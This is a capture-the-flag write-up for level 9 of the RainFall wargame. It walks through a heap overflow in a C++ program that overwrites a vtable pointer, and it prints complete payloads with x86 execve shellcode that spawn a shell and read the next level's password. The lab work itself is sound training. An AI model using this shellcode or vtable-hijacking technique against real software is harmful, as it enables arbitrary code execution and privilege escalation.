# Level 9

## Answer
Our CPP source code generates the same assembly code as the original binary. Compile it as follows:
```
g++ -fno-stack-protector source.c
```

Let's take a look at the source code:
```cpp
#include <cstring>
#include <cstdlib>

class N
{
private:
    // int vtable;
    char annotation[100];
    int nbr;

public:
    N(int val) : nbr(val) {}

    void setAnnotation(char *ann) { std::memcpy(this->annotation, ann, std::strlen(ann)); }

    virtual int operator+(N &other) { return this->nbr + other.nbr; }
    virtual int operator-(N &other) { return this->nbr - other.nbr; }
};

int main(int argc, char **argv)
{
    if (argc <= 1)
        exit(1);

    N *ptr1 = new N(5);
    N *ptr2 = new N(6);

    N &ref1 = *ptr1;
    N &ref2 = *ptr2;

    ref1.setAnnotation(argv[1]);

    return ref2 + ref1;
}
```

Let's focus on the `main` function. It reads input from the command line and then copies it to the `annotation` buffer using `memcpy`. Although `memcpy` is generally considered safe, in this case, we're copying the input without checking its size, which can lead to a buffer overflow. The `setAnnotation` function is called on the first object, allowing us to overflow the first object's buffer and potentially reach the second object's VTable address.

The VTable contains pointers to the virtual functions of the class. When a virtual function is called, the program looks up the VTable to find the address of the function to call. Therefore, by overwriting the VTable pointer, we can manipulate the virtual function call.
> Learn more about Vtables [here](https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/).

If we overwrite the VTable pointer with the address of a function or location of our choice, the program will jump to that address instead of the VTable. Then, it will perform another jump, thinking it's jumping to the function pointed to by the VTable. However, it will actually be jumping to our address, allowing us to execute arbitrary code.

We'll use `ltrace` to understand the memory allocations and calculate the size needed for the overflow:
```bash
level9@RainFall:~$ ltrace ./level9 test
[...]
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280) = 0x804a008 #ptr1
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280) = 0x804a078 #ptr2
[...]
```
The `_Znwj` function creates a new `N` object. We can see our two objects are allocated at addresses `0x804a008` and `0x804a078` which are 112 bytes apart.

We assume the following memory layout for each object:  
`[vtable (4 bytes)] [annotation (100 bytes)] [value (4 bytes)] [padding (4 bytes)]`.

Let's confirm our assumptions with `gdb`:
```bash
# Break at the setAnnotation function
(gdb) break _ZN1N13setAnnotationEPc
Breakpoint 1 at 0x8048714

# Run the program with a 112 bytes long input
(gdb) run `python -c 'print("A" * 112)'`
Starting program: /home/user/level9/level9 `python -c 'print("A" * 112)'`

Breakpoint 1, 0x08048714 in N::setAnnotation(char*) ()
(gdb) x/56wx 0x804a008
# This is ptr1
# 0x08048848 is the address of the vtable
# 0x00000000 is the value of annotation
# 0x00000005 is the value of nbr
# 0x00000071 is the value of the padding
0x804a008:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
# This is ptr2
# 0x08048848 is the address of the vtable
# 0x00000000 is the value of annotation
# 0x00000006 is the value of nbr
# 0x00020f21 is the value of the padding
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21

# Continue execution
(gdb) step
Single stepping until exit from function _ZN1N13setAnnotationEPc,
which has no line number information.
0x0804867c in main ()

# As expected, the vtable pointer is overwritten with the input
(gdb) x/56wx 0x804a008
0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a078:      0x41414141      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
```

Our assumptions are correct, so to reach the VTable pointer of `ptr2`, we'll need to write 108 bytes of padding. Anything written after that will overwrite the VTable pointer.

Let's craft our payload:
```
address of the shellcode + shellcode + padding + address pointing to the shellcode address

0x0804a008 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90"*(108-4-4-21) + 0x0804a00c

-4 bytes for the address of the shellcode
-4 bytes for the address pointing to the shellcode address
-21 bytes for the shellcode
```

As mentioned before, we'll have to jump twice to reach the shellcode. The first jump is to get to the shellcode address, and the second jump is to get to the shellcode itself.

Let's run our payload:
```bash
level9@RainFall:~$ ./level9 `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 83 + "\x08\x04\xa0\x0c"[::-1])'`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

We are now bonus0! Let's move on to the next level.
